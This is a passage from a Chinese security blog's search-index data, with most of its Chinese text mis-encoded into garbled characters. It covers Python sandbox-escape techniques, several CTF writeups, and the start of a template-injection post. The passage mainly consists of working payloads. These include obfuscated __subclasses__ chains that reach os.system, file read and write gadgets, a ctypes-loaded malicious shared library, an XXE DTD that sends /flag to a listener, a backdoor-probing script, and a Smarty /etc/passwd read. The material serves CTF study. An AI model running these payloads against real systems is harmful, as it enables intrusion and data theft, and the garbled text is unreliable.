osï¼Œç›´æ¥ä¸è®©è¿è¡Œã€‚é‚£ä¹ˆå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å„ç§å˜åŒ–æ¥å¼•å…¥ osï¼š 1234__import__(&#x27;so&#x27;[::-1]).system(&#x27;ls&#x27;)b = &#x27;o&#x27;a = &#x27;s&#x27;__import__(a+b).system(&#x27;ls&#x27;) è¿˜å¯ä»¥åˆ©ç”¨ eval æˆ–è€… execï¼š 12345&gt;&gt;&gt; eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1])macr0phag30&gt;&gt;&gt; exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])macr0phag3 evalã€exec éƒ½æ˜¯ç›¸å½“å±é™©çš„å‡½æ•°ï¼Œexec æ¯” eval è¿˜è¦å±é™©ï¼Œå®ƒä»¬ä¸€å®šè¦è¿‡æ»¤ï¼Œå› ä¸ºå­—ç¬¦ä¸²æœ‰å¾ˆå¤šå˜å½¢çš„æ–¹å¼ï¼Œå¯¹å­—ç¬¦ä¸²çš„å¤„ç†å¯ä»¥æœ‰ï¼šé€†åºã€å˜é‡æ‹¼æ¥ã€base64ã€hexã€rot13â€¦ç­‰ç­‰ getattr()__globals__ï¼šè¿”å›ä¸€ä¸ªå½“å‰ç©ºé—´ä¸‹èƒ½ä½¿ç”¨çš„æ¨¡å—ï¼Œæ–¹æ³•å’Œå˜é‡çš„å­—å…¸ 123456789101112&gt;&gt;&gt; class test():... name=&quot;Moonback&quot;... def run(self):... return &quot;HelloWorld&quot;...&gt;&gt;&gt; t=test()&gt;&gt;&gt; getattr(t,&quot;name&quot;)#è·å–nameå±æ€§ï¼Œå­˜åœ¨å°±æ‰“å°å‡ºæ¥ã€‚&#x27;Moonback&#x27;&gt;&gt;&gt; getattr(t,&quot;run&quot;)#è·å–runæ–¹æ³•ï¼Œå­˜åœ¨å°±æ‰“å°å‡ºæ–¹æ³•çš„å†…å­˜åœ°å€ã€‚&lt;bound method test.run of &lt;__main__.test object at 0x00000110F74FC4E0&gt;&gt;&gt;&gt;&gt; getattr(t,&quot;run&quot;)() #è·å–runæ–¹æ³•ï¼Œåé¢åŠ æ‹¬å·å¯ä»¥å°†è¿™ä¸ªæ–¹æ³•è¿è¡Œã€‚&#x27;HelloWorld&#x27; å¦‚æœ.è¢«waf,å¯ä»¥ç”¨getattr()æ¥æ›¿ä»£ã€‚payloadï¼š 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;ls&#x27;) è½¬æ¢è¿‡ç¨‹ 123456[].__class__ ==&gt; getattr([],&#x27;__class__&#x27;)[].__class__.__base__ ==&gt; getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;)[].__class__.__base__.__subclasses__()[59] ==&gt; getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59]#åé¢æœ‰æ‹¬å·[].__class__.__base__.__subclasses__()[59].__init__ ==&gt; getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;][].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;],&#x27;__dict__&#x27;)[&#x27;os&#x27;] æœ€ç»ˆpayload 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;],&#x27;__dict__&#x27;)[&#x27;os&#x27;],&#x27;system&#x27;)(&#x27;ls&#x27;) è¿™ç§æ–¹æ³•çš„å¥½å¤„æ˜¯ç»•è¿‡.å¹¶ä¸”å‡½æ•°åæˆ–å±æ€§åéƒ½ç”¨å­—ç¬¦ä¸²çš„æ–¹å¼å†™å…¥payloadä¸­ã€‚é‚£ä¹ˆå¯æ‹“å±•çš„æ–¹æ³•å°±æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ï¼š å¦‚æœ_è¢«wafäº†,å¯ä»¥ç”¨dir(0)[0][0]ä»£æ›¿ 12&gt;&gt;&gt; dir(0)[0][0]&#x27;_&#x27; æ¯”å¦‚ä¸Šé¢çš„payloadå¯ä»¥è½¬æ¢ä¸º 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#x27;class&#x27;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#x27;base&#x27;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#x27;subclasses&#x27;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#x27;init&#x27;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#x27;globals&#x27;+dir(0)[0][0]*2)[&#x27;linecache&#x27;],dir(0)[0][0]*2+&#x27;dict&#x27;+dir(0)[0][0]*2)[&#x27;os&#x27;],&#x27;system&#x27;)(&#x27;ls&#x27;) __getattribute__()__getattribute__æ˜¯å±æ€§è®¿é—®æ‹¦æˆªå™¨ï¼Œå°±æ˜¯å½“è¿™ä¸ªç±»çš„å±æ€§è¢«è®¿é—®æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ç±»çš„__getattribute__æ–¹æ³•ã€‚é€šè¿‡__getattribute__æˆ‘ä»¬å¯ä»¥ä¼ å­—ç¬¦ä¸²æ¥è¿›è¡Œæ–¹æ³•çš„è°ƒç”¨ 123456789&gt;&gt;&gt; class Test(object):... def __init__(self):... self.name=&#x27;Test&#x27;... def echo(self):... print(self.name)...&gt;&gt;&gt; a=Test()&gt;&gt;&gt; a.__getattribute__(&#x27;echo&#x27;)()Test åº”ç”¨åœºæ™¯: æ¯”å¦‚è¯´ä¸€ä¸ªæ²™ç›’wafäº†â€™lsâ€™å¯¼è‡´å±æ€§â€™globalsâ€™ä¸èƒ½ç”¨ï¼Œé‚£ä¹ˆpayload 1().__class__.__mro__[-1].__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;) å¯ä»¥è½¬æ¢ä¸º 1().__class__.__mro__[-1].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&quot;linecache&quot;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;system&#x27;](&#x27;l&#x27;+&#x27;s&#x27;) func_globals: è¿™ä¸ªå±æ€§æŒ‡å‘å®šä¹‰å‡½æ•°æ—¶çš„å…¨å±€å‘½åç©ºé—´ï¼Œè¿”å›å®ƒæ‰€æœ‰è°ƒç”¨çš„åŸºç±»å’Œå‡½æ•°__init__ï¼š è¿”å›ä¸€ä¸ªå‡½æ•°å¯¹è±¡__dict__ï¼šè¿”å›æ‰€æœ‰å±æ€§ï¼ŒåŒ…æ‹¬å±æ€§ï¼Œæ–¹æ³•ç­‰ æ„é€ soåº“åœ¨().__class__.__bases__[0].__subclasses__()ä¸­å‘ç°æœ‰å¯ç”¨çš„ç±» 123&lt;type &#x27;file&#x27;&gt;&lt;class &#x27;ctypes.CDLL&#x27;&gt;&lt;class &#x27;ctypes.LibraryLoader&#x27;&gt; æ„é€ ä¸€ä¸ªsoåº“ï¼Œåˆ—ä¸€ä¸‹/home/ctf/ä¸‹çš„æ–‡ä»¶ 123456#include &lt;stdio.h&gt; void my_init(void) __attribute__((constructor)); void my_init(void) &#123; system(&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;);&#125; å°†ç¼–è¯‘å¥½çš„soç›´æ¥äºŒè¿›åˆ¶å†™å…¥/tmp/bk.soä½¿ç”¨ctypesåŠ è½½so 1().__class__.__bases__[0].__subclasses__()[86](().__class__.__bases__[0].__subclasses__()[85]).LoadLibrary(&#x27;/tmp/bk.so&#x27;) fä¿®é¥°ç¬¦åœ¨PEP 498ä¸­å¼•å…¥äº†æ–°çš„å­—ç¬¦ä¸²ç±»å‹ä¿®é¥°ç¬¦ï¼šfæˆ–Fï¼Œç”¨fä¿®é¥°çš„å­—ç¬¦ä¸²å°†å¯ä»¥æ‰§è¡Œä»£ç ã€‚å¯ä»¥å‚è€ƒæ­¤æ–‡æ¡£ https://www.python.org/dev/peps/pep-0498/ åªæœ‰åœ¨python3.6.0+çš„ç‰ˆæœ¬æ‰æœ‰è¿™ä¸ªæ–¹æ³•ã€‚ç®€å•æ¥è¯´ï¼Œå¯ä»¥ç†è§£ä¸ºå­—ç¬¦ä¸²å¤–å±‚å¥—äº†ä¸€ä¸ªexec() 123456&gt;&gt;&gt; f&#x27;&#123;print(&quot;MoonBack&quot;)&#125;&#x27;MoonBack&#x27;None&#x27;&gt;&gt;&gt; f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#125;&#x27; é©±åŠ¨å™¨ C ä¸­çš„å·æ˜¯ Windows..... è¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼äºphpä¸­çš„&lt;?php &quot;$&#123;@phpinfo()&#125;&quot;; ?&gt;ï¼Œä½†pythonä¸­æ²¡æœ‰å°†æ™®é€šå­—ç¬¦ä¸²è½¬æˆfå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œæ‰€ä»¥å®é™…ä½¿ç”¨æ—¶æ•ˆæœä¸æ˜ã€‚ ä¸€äº›å¸¸ç”¨payloadåˆ©ç”¨fileç±»å®Œæˆæ–‡ä»¶è¯»å–åˆ©ç”¨objectå­ç±»ä¸­çš„fileæ–¹æ³• 1().__class__.__bases__[0].__subclasses__()[40] ä¸Šè¿°è¿”å›çš„å†…å®¹æ˜¯ï¼Œç›¸å½“äºopen()å‡½æ•° 12().__class__.__bases__[0].__subclasses__()[40](&#x27;test.py&#x27;).read()# ç­‰ä»·äº open(&#x27;test.py&#x27;).read() è°ƒç”¨å…¶ä»–ç±»ä¸­çš„OSæ¨¡å—å®Œæˆå‘½ä»¤æ‰§è¡Œåœ¨å½“å‰æ²™ç®±ä¸­ï¼Œimportç­‰æ¨¡å—è¢«ç¦ç”¨ï¼Œä½†æ˜¯ï¼Œåœ¨åˆ«çš„æ¨¡å—ä¸­å¦‚æœæœ¬èº«åŠ è½½æœ‰osçš„æ¨¡å—ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è°ƒç”¨çš„ã€‚å¦‚ä¸‹æ‰€ç¤º 123456789class &#x27;warnings.catch_warnings&#x27;# åœ¨è¿™ä¸ªç±»ä¸­ï¼Œè°ƒç”¨äº†osæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é—´æ¥æŠŠosæ¨¡å—è°ƒç”¨è¿›æ¥ã€‚# win 32().__class__.__bases__[0].__subclasses__()[54]# linux 2().__class__.__bases__[0].__subclasses__()[59]# linux 2 print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;))# func_globals:è¿”å›ä¸€ä¸ªåŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ï¼› éå†æ‰¾åˆ°å…¶ä»–çš„é€ƒé€¸æ–¹æ³•é€šè¿‡ä¸Šé¢çš„ä¸€äº›ç»•è¿‡å§¿åŠ¿æˆ‘ä»¬å‘ç°ï¼Œæ— å¤–ä¹æ˜¯åˆ©ç”¨ subclasses ä¸­çš„ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•æˆ–è€…æ¨¡å—ç„¶åæ¥è°ƒç”¨ä¸€äº›å‡½æ•°æˆ–è€…æ¨¡å—æ¥è¯»å–æ–‡ä»¶ï¼Œæˆ–è€…æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥éå†æ‰€æœ‰çš„ç³»ç»Ÿåº“ï¼Œç„¶åæ‰¾åˆ°æ‰€æœ‰çš„ä½¿ç”¨äº†osç­‰æ¨¡å—çš„æ¨¡å—ï¼Œæœ€åéå† subclasses åˆ—è¡¨ï¼Œæ‰¾åˆ°æ‰€æœ‰å¯ä»¥ç»•è¿‡çš„å§¿åŠ¿ã€‚ åŒ…åŒ…å“¥çš„python2 payload 123456789101112131415161718192021# åˆ©ç”¨file()å‡½æ•°è¯»å–æ–‡ä»¶ï¼šï¼ˆå†™ç±»ä¼¼ï¼‰().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()# æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].os.system(&#x27;ls&#x27;)# æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)# é‡æ–°è½½å…¥__builtins__ï¼š().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)#è¯»æ–‡ä»¶().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\\1.php&#x27;).read()#å†™æ–‡ä»¶().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)#æ‰§è¡Œä»»æ„å‘½ä»¤().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&#x27; )# åˆ©ç”¨ __getattibute__ æ–¹æ³•x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == &#x27;ca&#x27;+&#x27;tch_warnings&#x27;][0].__init__x.__getattribute__(&quot;func_global&quot;+&quot;s&quot;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;l&#x27;+&#x27;s&#x27;) n3k0å¤§å“¥çš„python3 payloadpython3å„ä¸ªå°ç‰ˆæœ¬ä¹‹é—´æœ‰åŒºåˆ«ï¼Œæœ‰çš„payloadå¯ä»¥ç”¨äºpy3.7 æœ‰çš„å¯ä»¥ç”¨äºpy3.5 123456789().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;ls&#x27;)().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;system&#x27;](&#x27;ls&#x27;)().__class__.__bases__[0].__subclasses__()[104].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;sy&#x27;+&#x27;s&#x27;].modules[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;) å‚è€ƒï¼š www.gtfly.top/2019/07/25/pythonæ²™ç›’é€ƒé€¸å­¦ä¹ .[html](www.gtfly.top/2019/07/25/pythonæ²™ç›’é€ƒé€¸å­¦ä¹ .html) https://xz.aliyun.com/t/52 https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/[](https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/) https://www.freebuf.com/articles/system/203208.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"python","slug":"python","permalink":"http://www.m00nback.xyz/tags/python/"}]},{"title":"buuctfåˆ·é¢˜-ç»¼åˆç¯‡","slug":"buuctfåˆ·é¢˜-ç»¼åˆç¯‡","date":"2020-02-13T14:12:16.000Z","updated":"2020-05-15T07:51:20.455Z","comments":true,"path":"2020/02/13/buuctfåˆ·é¢˜-ç»¼åˆç¯‡/","link":"","permalink":"http://www.m00nback.xyz/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/","excerpt":"è®°ä¸€ä¸‹ç»¼åˆé¢˜ç›®çš„writeup!","text":"è®°ä¸€ä¸‹ç»¼åˆé¢˜ç›®çš„writeup! [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢writeupä¸‹è½½www.tar.gzå‘ç°æ˜¯3000å¤šä¸ªphpåé—¨æ–‡ä»¶ï¼Œä¸è¿‡éƒ½æ˜¯æ‰§è¡Œä»£ç çš„ï¼Œå†™ä¸ªè„šæœ¬è·‘ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import osimport requestsimport reimport threadingimport timeprint(&#x27;å¼€å§‹æ—¶é—´ï¼š &#x27;+ time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100) #è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°filePath = r&quot;C:/Users/Desktop/www/src&quot;os.chdir(filePath) #æ”¹å˜å½“å‰çš„è·¯å¾„requests.adapters.DEFAULT_RETRIES = 5 #è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalsedef get_content(file): s1.acquire() print(&#x27;trying &#x27;+file+ &#x27; &#x27;+ time.asctime( time.localtime(time.time()) )) with open(file,encoding=&#x27;utf-8&#x27;) as f: #æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•° gets = list(re.findall(r&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) posts = list(re.findall(r&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) data = &#123;&#125; #æ‰€æœ‰çš„$_POST params = &#123;&#125; #æ‰€æœ‰çš„$_GET for m in gets: params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot; for n in posts: data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot; url = &#x27;http://127.0.0.1/src/&#x27;+file req = session.post(url, data=data, params=params) #ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST req.close() # å…³é—­è¯·æ±‚ é‡Šæ”¾å†…å­˜ req.encoding = &#x27;utf-8&#x27; content = req.text #print(content) if &quot;xxxxxx&quot; in content: #å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•° flag = 0 for a in gets: req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;) content = req.text req.close() # å…³é—­è¯·æ±‚ é‡Šæ”¾å†…å­˜ if &quot;xxxxxx&quot; in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;) content = req.text req.close() # å…³é—­è¯·æ±‚ é‡Šæ”¾å†…å­˜ if &quot;xxxxxx&quot; in content: break if flag == 1: #flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ param = a else: param = b print(&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;+file+&quot; and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot; %param) print(&#x27;ç»“æŸæ—¶é—´ï¼š &#x27; + time.asctime(time.localtime(time.time()))) s1.release()for i in files: #åŠ å…¥å¤šçº¿ç¨‹ t = threading.Thread(target=get_content, args=(i,)) t.start() è‡ªå·±å†™äº†å¥½ä¹…éƒ½æ²¡æˆåŠŸè·‘å‡ºæ¥ï¼Œä¹Ÿæ‡’å¾—å†æ”¹äº†ï¼Œç›´æ¥å‚è€ƒå¤§ä½¬çš„exp [ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejavajava webé¡¹ç›®ç›®å½•ï¼š 12345webapps # å«Webåº”ç”¨çš„ç¨‹åº(JSPã€Servletå’ŒJavaBeanç­‰)webapps/META-INF/ #å­˜æ”¾ä¸€äº›meta informationç›¸å…³çš„æ–‡ä»¶webapps/WEB-INF/classes/ #ç”¨äºå­˜æ”¾javaå­—èŠ‚ç æ–‡ä»¶webapps/WEB-INF/lib/ #ç”¨äºå­˜æ”¾è¯¥å·¥ç¨‹ç”¨åˆ°çš„åº“ï¼Œä¾‹å¦‚servlet-api.jarç­‰ç­‰webapps/WEB-INF/web.xml #webå·¥ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œå®Œæˆç”¨æˆ·è¯·æ±‚çš„é€»è¾‘åç§°åˆ°çœŸæ­£çš„servletç±»çš„æ˜ å°„ writeupæŸ¥çœ‹æºç å‘ç°æç¤ºflagåœ¨/flag,æµè§ˆå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°ä¸Šä¼ jsp webshellï¼Œä½†æ˜¯ä¸çŸ¥é“è·¯å¾„ï¼Œä¸Šä¼ å®Œä¹‹åå‘ç°å¯ä»¥ä¸‹è½½ï¼Œè¿™é‡Œå°±å­˜åœ¨ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ è¯•ç€å»è¯»WEB-INF/web.xml æ ¹æ®è¿™ä¸ªåŒ…çš„è·¯å¾„å»ä¸‹è½½.classæ–‡ä»¶ï¼Œç”±äºè¿™ä¸ªæ˜¯å­—èŠ‚ç æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åç¼–è¯‘ä¸€ä¸‹ï¼Œå‘ç° åˆ©ç”¨EXCELè¿›è¡ŒXXEæ”»å‡»ï¼šhttps://xz.aliyun.com/t/3741 æˆ‘ä»¬å°±å¯ä»¥xxeäº†ï¼Œå¦‚ä¸‹æ„é€ ï¼š vpsä¸Šçš„test.dtdï¼š 12&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; æœ€åä¸Šä¼ ä»¥ç±»ä¼¼äºexcel-1.xlsxçš„åå­—ä¸Šä¼ ï¼Œå°±èƒ½æ”¶åˆ°flagäº† [RoarCTF 2019]Easy Javawriteupè¿™é¢˜ç›¸å¯¹äºå‰ä¸€é¢˜å°±æ¯”è¾ƒç®€å•äº† æ‰“å¼€æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæš´åŠ›ç ´è§£å‘ç°å¯†ç æ˜¯admin888ï¼Œç™»é™†è¿›å»æç¤ºflagä¸åœ¨è¿™ ç™»é™†é¡µé¢æœ‰ä¸ªhelpï¼Œæ‰“å¼€æç¤ºjava.io.FileNotFoundExceptionï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯»æ–‡ä»¶çš„ ç›´æ¥è®¿é—®/help.docxï¼Œå‘ç°å¯ä»¥æŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼ŒçŒœæµ‹å¯ä»¥ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œä½†GETä¸èƒ½ï¼Œä¸æ¸…æ¥šä¸ºå•¥ è¯»ä¸‹WEB-INF/web.xml ï¼Œçœ‹åˆ° è¯»ä¸‹æºç WEB-INF/classes/com/wm/ctf/FlagController.class base64è§£å¯†å°±èƒ½å¾—åˆ°flagï¼Œä¹Ÿå¯ä»¥åç¼–è¯‘ä¸€ä¸‹çœ‹ä¸‹ä»£ç ","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"}]},{"title":"SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´","slug":"SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´","date":"2020-02-13T04:10:45.000Z","updated":"2020-06-14T05:40:16.595Z","comments":true,"path":"2020/02/13/SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´/","link":"","permalink":"http://www.m00nback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼ï¼ ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥ï¼ŸæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥(SSTI)ï¼Œå…¨ç§°Server-Side Template Injectionï¼Œä¸æˆ‘ä»¬ç†ŸçŸ¥çš„SQLæ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ç­‰åŸç†å¤§åŒå°å¼‚ï¼Œå½“ç”¨æˆ·çš„è¾“å…¥æ•°æ®æ²¡æœ‰è¢«åˆç†çš„å¤„ç†æ§åˆ¶æ—¶ï¼Œå°±æœ‰å¯èƒ½æ•°æ®æ’å…¥äº†ç¨‹åºæ®µä¸­å˜æˆäº†ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œæ”¹å˜äº†ç¨‹åºçš„æ‰§è¡Œé€»è¾‘ã€‚ å¸¸è§çš„æ¨¡æ¿å¼•æ“å„æ¡†æ¶æ¨¡æ¿ç»“æ„ï¼š PHPSmartySmartyæ˜¯æœ€æµè¡Œçš„PHPæ¨¡æ¿è¯­è¨€ä¹‹ä¸€ï¼Œä¸ºä¸å—ä¿¡ä»»çš„æ¨¡æ¿æ‰§è¡Œæä¾›äº†å®‰å…¨æ¨¡å¼ã€‚è¿™ä¼šå¼ºåˆ¶æ‰§è¡Œåœ¨ php å®‰å…¨å‡½æ•°ç™½åå•ä¸­çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­æ— æ³•ç›´æ¥è°ƒç”¨ php ä¸­ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°(ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªdisable_function) ä½†æ˜¯ï¼Œå®é™…ä¸Šå¯¹è¯­è¨€çš„é™åˆ¶å¹¶ä¸èƒ½å½±å“æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆè€ƒè™‘çš„åº”è¯¥æ˜¯æ¨¡æ¿æœ¬èº«ï¼Œæ°å¥½ Smarty å¾ˆç…§é¡¾æˆ‘ä»¬ï¼Œåœ¨é˜…è¯»æ¨¡æ¿çš„æ–‡æ¡£ä»¥åæˆ‘ä»¬å‘ç°ï¼š$smartyå†…ç½®å˜é‡å¯ç”¨äºè®¿é—®å„ç§ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ self å¾—åˆ° smarty è¿™ä¸ªç±»ä»¥åæˆ‘ä»¬å°±å»æ‰¾ smarty ç»™æˆ‘ä»¬çš„çš„æ–¹æ³•ã€‚ getStreamVariable() 12345678910111213141516171819public function getStreamVariable($variable)&#123; $_result = &#x27;&#x27;; $fp = fopen($variable, &#x27;r+&#x27;); if ($fp) &#123; while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123; $_result .= $current_line; &#125; fclose($fp); return $_result; &#125; $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this; if ($smarty-&gt;error_unassigned) &#123; throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;); &#125; else &#123; return null; &#125;&#125; å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•è¯»æ–‡ä»¶ï¼Œpayload: 1&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125; class Smarty_Internal_Write_File 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273class 